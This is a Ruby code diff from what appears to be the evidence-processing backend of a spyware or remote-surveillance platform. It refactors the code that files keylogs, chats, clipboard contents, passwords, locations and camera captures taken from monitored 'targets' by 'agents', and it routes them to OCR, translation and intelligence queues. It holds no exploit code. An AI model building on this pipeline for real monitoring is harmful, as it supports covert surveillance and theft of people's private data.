@@ -95,8 +95,70 @@ module Evidence
     trace :error, "Cannot update statisting while deleting evidence #{e.message}"
   end
 
-  # #TODO: rename into self.target (just like Aggregate#target)
-  def self.collection_class(target)
+  def target
+    @target ||= Item.find(target_id)
+  end
+
+  def agent
+    @agent ||= Item.find(aid)
+  end
+
+  def target_id
+    self.class.instance_variable_get '@target_id'
+  end
+
+  def may_have_readable_text_or_face?
+    #type == 'screenshot' or (type == 'file' and data[:type] == :capture) or type == 'camera'
+    (type == 'file' and data[:type] == :capture) or type == 'camera'
+  end
+
+  def translatable?
+    ['keylog', 'chat', 'clipboard', 'message'].include?(type)
+  end
+
+  def intelligence_relevant?
+    ['addressbook', 'password', 'position'].include?(type)
+  end
+
+  def enqueue
+    if LicenseManager.instance.check(:connectors)
+      return if RCS::DB::ConnectorManager.process_evidence(target, self) == :discard
+    end
+
+    # check if there are matching alerts for this evidence
+    RCS::DB::Alerting.new_evidence(self)
+
+    # add to the ocr processor queue
+    if LicenseManager.instance.check(:ocr) and may_have_readable_text_or_face?
+      OCRQueue.add(target.id, id)
+    end
+
+    # add to the translation queue
+    if LicenseManager.instance.check(:translation) and translatable?
+      TransQueue.add(target.id, id)
+      data[:tr] = "TRANS_QUEUED"
+      save
+    end
+
+    # add to the aggregator queue
+    if LicenseManager.instance.check(:correlation)
+      add_to_aggregator_queue
+    end
+
+    add_to_intelligence_queue
+
+    Item.send_dashboard_push(agent, target, target.get_parent)
+  end
+
+  def add_to_intelligence_queue
+    IntelligenceQueue.add(target_id, id, :evidence) if intelligence_relevant?
+  end
+
+  def add_to_aggregator_queue
+    AggregatorQueue.add(target_id, id, type)
+  end
+
+  def self.target(target)
     target_id = target.respond_to?(:id) ? target.id : target
     dynamic_classname = "Evidence#{target_id}"
 
@@ -147,7 +209,7 @@ module Evidence
   end
 
   def self.dynamic_new(target)
-    collection_class(target).new
+    target(target).new
   end
 
   def self.deep_copy(src, dst)
@@ -168,7 +230,7 @@ module Evidence
     raise "Target not found" if filter.nil?
 
     # copy remaining filtering criteria (if any)
-    filtering = Evidence.collection_class(target[:_id]).not_in(:type => ['filesystem', 'info'])
+    filtering = Evidence.target(target[:_id]).not_in(:type => ['filesystem', 'info'])
     filter.each_key do |k|
       filtering = filtering.any_in(k.to_sym => filter[k])
     end
@@ -184,7 +246,7 @@ module Evidence
     raise "Target not found" if filter.nil?
 
     # copy remaining filtering criteria (if any)
-    filtering = Evidence.collection_class(target[:_id]).not_in(:type => ['filesystem', 'info'])
+    filtering = Evidence.target(target[:_id]).not_in(:type => ['filesystem', 'info'])
     filter.each_key do |k|
       filtering = filtering.any_in(k.to_sym => filter[k])
     end
@@ -200,7 +262,7 @@ module Evidence
     raise "Target not found" if filter.nil?
 
     # copy remaining filtering criteria (if any)
-    filtering = Evidence.collection_class(target[:_id]).stats_relevant
+    filtering = Evidence.target(target[:_id]).stats_relevant
     filter.each_key do |k|
       filtering = filtering.any_in(k.to_sym => filter[k])
     end
@@ -343,7 +405,7 @@ module Evidence
     # we have to remove all the aggregates created from those evidence on the old target
     Aggregate.target(old_target[:_id]).destroy_all(aid: agent[:_id].to_s)
 
-    evidences = Evidence.collection_class(old_target[:_id]).where(:aid => agent[:_id])
+    evidences = Evidence.target(old_target[:_id]).where(:aid => agent[:_id])
 
     total = evidences.count
     chunk_size = 500
@@ -352,7 +414,7 @@ module Evidence
     # move the evidence in chunks to prevent cursor expiration on mongodb
     until evidences.count == 0 do
 
-      evidences = Evidence.collection_class(old_target[:_id]).where(:aid => agent[:_id]).limit(chunk_size)
+      evidences = Evidence.target(old_target[:_id]).where(:aid => agent[:_id]).limit(chunk_size)
 
       # copy the new evidence
       evidences.each do |old_ev|
@@ -376,8 +438,10 @@ module Evidence
 
         # add to the aggregator queue the evidence (we need to recalculate them in the new target)
         if LicenseManager.instance.check :correlation
-          AggregatorQueue.add(target[:_id], new_ev._id, new_ev.type)
+          new_ev.add_to_aggregator_queue
         end
+
+        new_ev.add_to_intelligence_queue if LicenseManager.instance.check(:intelligence)
 
         # delete the old one. NOTE CAREFULLY:
         # we use delete + explicit grid, since the callback in the destroy will fail
@@ -429,7 +493,7 @@ module Evidence
 
     trace :info, "Deleting evidence for target #{target.name} #{params}"
 
-    Evidence.collection_class(target._id.to_s).where(conditions).any_in(:rel => params['rel']).destroy_all
+    Evidence.target(target._id.to_s).where(conditions).any_in(:rel => params['rel']).destroy_all
 
     trace :info, "Deleting evidence for target #{target.name} done."
 
